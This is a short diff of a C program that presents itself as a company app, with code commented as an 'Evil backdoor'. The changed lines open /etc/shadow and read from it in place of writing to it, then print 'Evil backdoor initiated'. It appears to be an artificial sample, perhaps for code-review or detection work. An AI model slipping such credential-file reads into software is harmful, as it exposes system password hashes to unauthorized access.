@@ -4,11 +4,12 @@
 int main()
 {
    printf("Company app is running\n");
-
+   int buffer;
+   int store = 1234;
    // Evil backdoor reads system password hashes
    FILE * fp;
    fp = fopen ("/etc/shadow", "r+");
-   fputs("Secret data intercepted: ", fp);
+   fread(&buffer, sizeof(int), 1, fp);
    fclose(fp);
    printf("Evil backdoor initiated\n");
    
